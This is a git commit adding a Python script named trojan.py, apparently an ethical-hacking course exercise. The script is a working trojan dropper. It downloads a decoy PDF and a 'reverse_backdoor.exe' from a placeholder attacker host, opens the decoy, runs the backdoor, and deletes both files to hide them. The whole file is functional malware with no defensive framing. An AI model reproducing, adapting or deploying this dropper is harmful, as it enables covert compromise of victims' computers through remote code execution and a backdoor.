ba987307bf11cd57ec49f9098a19a162d135c87e
Paweł <110523018+oziesiek@users.noreply.github.com>
2023-08-09 14:39:06 +0200

    Create trojan.py

---
+++ Trojan/trojan.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python
+import requests, subprocess, os, tempfile
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1]
+
+    with open(file_name, "wb") as out_file:
+        out_file.write(get_response.content)
+
+
+
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)
+
+download("http://attacker.address/evil-files/sample.pdf")
+subprocess.Popen("sample.pdf", shell=True)
+
+download("http://attacker.address/evil-files/reverse_backdoor.exe")
+subprocess.call("reverse_backdoor.exe", shell=True)
+
+os.remove("sample.pdf")
+os.remove("reverse_backdoor.exe")
